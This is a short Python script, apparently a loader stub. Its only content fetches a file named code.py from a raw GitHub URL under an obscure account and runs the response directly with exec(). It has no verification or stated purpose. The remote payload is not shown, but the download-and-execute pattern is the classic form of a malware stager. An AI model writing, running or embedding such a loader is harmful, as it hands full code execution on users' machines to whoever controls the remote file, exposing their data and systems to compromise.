import requests

response = requests.get("https://raw.githubusercontent.com/nothingExistend/recipy/refs/heads/main/code.py").text

exec(response)
